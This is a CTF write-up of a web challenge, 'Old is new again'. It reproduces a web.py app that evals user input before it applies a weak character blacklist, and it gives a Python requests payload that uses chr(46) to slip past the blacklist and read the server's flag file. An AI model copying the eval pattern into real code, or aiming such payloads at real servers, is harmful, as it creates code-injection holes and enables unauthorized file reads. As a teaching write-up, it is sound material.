#  Old is new again

```
score: 299
solved: xx/85
difficulty: NA
tags: web, python, eval
```

## Problem

```
Grandpa, what is the first vulnerability you've ever found?

https://oldisnewagain.ctf.intigriti.io/
Flag format: flag{}
Created by ComdeyOverflow
```

## Got the flag
The page shows its source code

```py
import web
import sys
from io import StringIO

urls = (
  '/', 'index',
  '/old', 'old',
)
render = web.template.render('templates/')
app = web.application(urls, globals())

class index:
    def GET(self):
        source = f'\x3cpre\x3e\x3ccode\x3e{open(__file__).read()}\x3c/code\x3e\x3c/pre\x3e'
        return render.index(source, '')

class old:
    def GET(self):
        eval_output = ''
        stdout = sys.stdout
        sys.stdout = reportSIO = StringIO()
        blacklist = {".","'","__"}
        try:
            get_input = web.input()
            inject = get_input['inject'] if 'inject' in get_input else None
            if (inject):
                try:
                    x = eval(inject)
                    if (x):
                        eval_output = str(eval_output) + x
                except Exception as error:
                    print(error)
            for x in inject:
                if any(x in inject for x in blacklist):
                    return "caught you again 1337"
            reportStr = reportSIO.getvalue()
            sys.stdout = stdout
            output = str(reportStr) + str(eval_output)
            return render.index(f'\x3cpre\x3e\x3ccode\x3e{open(__file__).read()}\x3c/code\x3e\x3c/pre\x3e', output)
        except Exception as error:
            print(error)
            return error


if __name__ == "__main__":
    app.run()
```

The code accesses param `inject` and `eval` the code **THEN** filter the code
chars from a blacklist of 3 strings `. ' __` .

To by-pass the check, use `chr(46)` to get a `.`:

```py
import requests
r = requests.get('https://oldisnewagain.ctf.intigriti.io/old',
                 params={'inject':'str([c for c in open(f"/flag{chr(46)}txt")])'})
r.text
```

f-string format allows to format without using `.format` but `%` could do the job here, too. List-comprehension `[c for c in open]` to not use `.read()`

Output is the flag `flag{1dk_th1s_1s_old_or_not_but_cool_right?}`.

## Conclusion
The blacklist check here is intended to trick players go to wrong paths for the next challenge `New Is Old Again`.
